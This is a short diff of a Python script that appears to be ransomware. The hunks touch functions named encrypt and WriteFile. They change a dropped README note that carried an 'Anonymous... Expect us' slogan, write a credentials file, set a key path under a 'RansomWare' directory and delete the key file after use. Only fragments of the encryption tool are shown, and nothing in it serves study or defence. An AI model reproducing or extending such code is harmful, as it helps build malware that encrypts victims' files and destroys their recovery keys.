@@ -23,8 +23,8 @@ def encrypt(items,key):
 
 def WriteFile(path):
     with open(path + '/README.txt','w') as file:
-        file.write('We are Anonymous, we are legion,\n')
-        file.write('we do not forgive, we do not forget. Expect us.')
+        file.write('Hello world,\n')
+        
 
     with open(path + '/Credenciales.txt','w') as file:
         file.write(path +'\n')
@@ -43,7 +43,7 @@ def AnonNews(path):
     #    start = time.time()         
     #   end = time.time()
     #   segundos = segundos + (end-start)
-    path_key = '/home/anon23/Descargas/RansomWare'
+    path_key = '/home/anon23/Descargas/'
     if os.path.exists(path_key + '/key.txt'):
         os.remove(path_key + '/key.txt')
 
